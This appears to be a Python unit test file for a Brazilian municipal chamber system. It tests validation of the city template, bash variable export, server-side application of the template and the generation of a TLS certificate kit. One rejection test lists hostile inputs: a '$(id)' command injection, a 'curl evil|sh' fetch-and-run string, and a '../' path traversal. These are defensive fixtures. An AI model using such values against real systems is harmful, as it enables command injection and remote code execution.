"""Modelo de cidade: validação, variáveis para o bash, Tuntum congelada, aplicação no servidor e kit do certificado."""
import base64
import json
import os
import subprocess
import sys
import tempfile
import unittest
import urllib.request
from pathlib import Path

RAIZ = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(RAIZ / "server"))
import modelo_cidade  # noqa: E402
from apoio import Servidor  # noqa: E402

PNG = base64.b64decode("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")


class Validacao(unittest.TestCase):
    def test_padroes(self):
        m = modelo_cidade.validar({"uf": "ma", "municipio": "Barra do Corda"})
        self.assertEqual((m["uf"], m["nome"], m["camara"]), ("MA", "barra-do-corda", "Câmara Municipal de Barra do Corda"))
        self.assertTrue(m["radio"]["ligada"])
        self.assertEqual(m["radio"]["nome"], "Câmara Municipal de Barra do Corda — Rádio")
        self.assertTrue(m["plenarioVirtual"]["ligado"])
        self.assertFalse(m["congelada"])
        m = modelo_cidade.validar({"uf": "MA", "municipio": "Tuntum",
                                   "portal": {"url": "https://www.cmtuntum.legislativomunicipal.com/"}})
        self.assertEqual(m["portal"]["url"], "https://www.cmtuntum.legislativomunicipal.com")

    def test_recusa_o_que_esta_errado(self):
        ruins = [
            {"uf": "XX", "municipio": "A"},
            {"uf": "MA", "municipio": "Tuntum$(id)"},
            {"uf": "MA", "municipio": "Tuntum", "corDestaque": "#fff"},            # campo desconhecido
            {"uf": "MA", "municipio": "Tuntum", "visual": {"destaque": "verde"}},
            {"uf": "MA", "municipio": "Tuntum", "youtube": {"link": "https://x;curl evil|sh"}},
            {"uf": "MA", "municipio": "Tuntum", "radio": {"bitrate": 100}},
            {"uf": "MA", "municipio": "Tuntum", "regimento": {"fases": {"xx": {"min": 5}}}},
            {"uf": "MA", "municipio": "Tuntum", "certificado": {"nomesExtras": ["a b"]}},
            {"uf": "MA", "municipio": "Tuntum", "brasao": "../segredo.png"},
            {"uf": "MA", "municipio": "Tuntum", "plenarioVirtual": {"videoconferencia": "zoom"}},
            {"uf": "MA", "municipio": "Tuntum", "portal": {"url": "https://evil.example.com"}},
            {"uf": "MA", "municipio": "Tuntum", "portal": {"url": "http://www.cmtuntum.legislativomunicipal.com"}},
        ]
        for dado in ruins:
            with self.assertRaises(modelo_cidade.ModeloInvalido, msg=str(dado)):
                modelo_cidade.validar(dado)

    def test_modelos_do_repositorio(self):
        for arq in (RAIZ / "cidades").glob("*/camara.json"):
            modelo_cidade.ler(arq)   # todos válidos
        self.assertTrue(modelo_cidade.ler(RAIZ / "cidades/tuntum/camara.json")["congelada"])
        self.assertFalse(modelo_cidade.ler(RAIZ / "cidades/modelo/camara.json")["congelada"])


class FerramentaDoPacote(unittest.TestCase):
    def roda(self, *args):
        return subprocess.run([sys.executable, str(RAIZ / "packaging/modelo.py"), *args], capture_output=True, text=True)

    def test_tuntum_congelada(self):
        self.assertEqual(self.roda("congelada", "tuntum").returncode, 0)
        self.assertEqual(self.roda("congelada", "arame").returncode, 1)

    def test_variaveis_com_apostrofo_vao_inteiras_para_o_bash(self):
        with tempfile.TemporaryDirectory() as d:
            arq = Path(d) / "camara.json"
            arq.write_text(json.dumps({"uf": "MA", "municipio": "Olho d'Água das Cunhãs", "brasao": "b.png",
                                       "recursos": {"ia": "nao"}}), encoding="utf-8")
            (Path(d) / "b.png").write_bytes(PNG)
            r = self.roda("vars", str(arq))
            self.assertEqual(r.returncode, 0, r.stderr)
            saida = subprocess.run(["bash", "-c", 'eval "$1"; printf "%s|%s|%s|%s" "$MUN" "$NOME" "$IA" "$BRASAO"', "_", r.stdout],
                                   capture_output=True, text=True).stdout
            mun, nome, ia, brasao = saida.split("|")
            self.assertEqual((mun, nome, ia), ("Olho d'Água das Cunhãs", "olho-d-agua-das-cunhas", "false"))
            self.assertTrue(brasao.endswith("/b.png"))

    def test_brasao_faltando(self):
        with tempfile.TemporaryDirectory() as d:
            arq = Path(d) / "camara.json"
            arq.write_text(json.dumps({"uf": "MA", "municipio": "Arame", "brasao": "nao-tem.png"}), encoding="utf-8")
            r = self.roda("validar", str(arq))
            self.assertEqual(r.returncode, 1)
            self.assertIn("brasao", r.stderr)


class AplicaNoServidor(unittest.TestCase):
    def test_aplica_uma_vez_por_banco(self):
        with tempfile.TemporaryDirectory() as d:
            modelo = Path(d) / "modelo" / "camara.json"
            modelo.parent.mkdir()
            (modelo.parent / "brasao.png").write_bytes(PNG)
            dado = {"uf": "MA", "municipio": "Arame", "camara": "Câmara Municipal de Arame", "brasao": "brasao.png",
                    "visual": {"destaque": "#123456", "tema": "claro"},
                    "contatos": {"email": "contato@arame.ma.leg.br", "instagram": "@camaraarame"},
                    "radio": {"nome": "Rádio Legislativa de Arame", "bitrate": 96},
                    "plenarioVirtual": {"videoconferencia": "publica"},
                    "youtube": {"link": "https://www.youtube.com/@camaraarame/live"},
                    "regimento": {"tempos": {"alerta": 30, "aparte": 90, "ordem": 120},
                                  "fases": {"ge": {"min": 20, "totalMin": 80}}}}
            modelo.write_text(json.dumps(dado), encoding="utf-8")
            banco = f"{d}/legis.db"
            s = Servidor(LEGIS_MODELO=str(modelo), PARLATORIO_BANCO=banco)
            try:
                e = s.estado()
                self.assertEqual((e["casa"]["nome"], e["casa"]["destaque"], e["casa"]["tema"]),
                                 ("Câmara Municipal de Arame", "#123456", "claro"))
                self.assertEqual(e["rodape"]["camara"]["instagram"], "https://camaraarame")
                self.assertEqual(e["transmissao"]["nome"], "Rádio Legislativa de Arame")
                self.assertTrue(e["remoto"]["ativo"])
                self.assertEqual(e["remoto"]["servidor"], "https://meet.jit.si")
                self.assertEqual(e["youtube"]["link"], "https://www.youtube.com/@camaraarame/live")
                self.assertEqual((e["cfg"]["alerta"], e["cfg"]["aparte"]), (30, 90))
                self.assertEqual(next(f for f in e["fases"] if f["id"] == "ge")["min"], 20)
                self.assertGreater(e["casa"]["logoV"], 0)
                with urllib.request.urlopen(s.base + "/imagem/logo", timeout=10) as r:
                    self.assertEqual(r.read(), PNG)
            finally:
                s.parar()
            # o modelo muda depois: o banco já aplicado continua com o que tinha (vale o painel da Câmara)
            dado["visual"]["destaque"] = "#abcdef"
            modelo.write_text(json.dumps(dado), encoding="utf-8")
            s = Servidor(LEGIS_MODELO=str(modelo), PARLATORIO_BANCO=banco)
            try:
                self.assertEqual(s.estado()["casa"]["destaque"], "#123456")
            finally:
                s.parar()
            # reaplicar de propósito
            env = {**os.environ, "PARLATORIO_BANCO": banco, "LEGIS_MODELO": str(modelo), "HTTPS": "0", "BACKUP_HORA": ""}
            r = subprocess.run([sys.executable, str(RAIZ / "server/servidor.py"), "--reaplicar-modelo"], env=env,
                               capture_output=True, text=True, timeout=60)
            self.assertIn("Modelo reaplicado", r.stdout, r.stderr)
            s = Servidor(LEGIS_MODELO=str(modelo), PARLATORIO_BANCO=banco)
            try:
                self.assertEqual(s.estado()["casa"]["destaque"], "#abcdef")
            finally:
                s.parar()

    def test_modelo_invalido_nao_derruba_o_servidor(self):
        with tempfile.TemporaryDirectory() as d:
            modelo = Path(d) / "camara.json"
            modelo.write_text('{"uf": "ZZ"}', encoding="utf-8")
            s = Servidor(LEGIS_MODELO=str(modelo))
            try:
                self.assertEqual(s.estado()["casa"]["nome"], "Câmara Municipal")
            finally:
                s.parar()


class KitDoCertificado(unittest.TestCase):
    def test_kit_para_os_aparelhos(self):
        with tempfile.TemporaryDirectory() as d:
            env = {**os.environ, "PARLATORIO_BANCO": f"{d}/legis.db", "LEGIS_NOME": "arame", "HTTPS": "auto",
                   "PORTA_HTTPS": "443", "BACKUP_HORA": "", "TLS_NOMES": "camara.arame.ma.leg.br"}
            r = subprocess.run([sys.executable, str(RAIZ / "server/servidor.py"), "--kit-certificado", f"{d}/kit"],
                               env=env, capture_output=True, text=True, timeout=120)
            self.assertEqual(r.returncode, 0, r.stderr)
            kit = Path(d) / "kit"
            nomes = sorted(p.name for p in kit.iterdir())
            self.assertEqual(len(nomes), 4, nomes)
            self.assertTrue((kit / "LEGIS-certificado.crt").read_text().startswith("-----BEGIN CERTIFICATE-----"))
            self.assertIn("https://arame.local", (kit / "Windows - instalar certificado.cmd").read_text(encoding="ascii", errors="ignore"))
            # o certificado do servidor cobre o nome extra e é assinado pela autoridade da Câmara
            nomes_crt = subprocess.run(["openssl", "x509", "-in", f"{d}/tls/servidor.crt", "-noout", "-ext", "subjectAltName"],
                                       capture_output=True, text=True).stdout
            self.assertIn("camara.arame.ma.leg.br", nomes_crt)
            v = subprocess.run(["openssl", "verify", "-CAfile", str(kit / "LEGIS-certificado.crt"), f"{d}/tls/servidor.crt"],
                               capture_output=True, text=True)
            self.assertIn("OK", v.stdout, v.stderr)


class Scripts(unittest.TestCase):
    def test_sintaxe(self):
        for arq in ("packaging/instalar-legis.sh", "packaging/construir-cidade.sh", "packaging/construir-deb.sh",
                    "packaging/publicar-camara.sh", "packaging/deb/DEBIAN/postinst", "packaging/deb/raiz/usr/sbin/legis"):
            r = subprocess.run(["bash", "-n", str(RAIZ / arq)], capture_output=True, text=True)
            self.assertEqual(r.returncode, 0, f"{arq}: {r.stderr}")


if __name__ == "__main__":
    unittest.main()
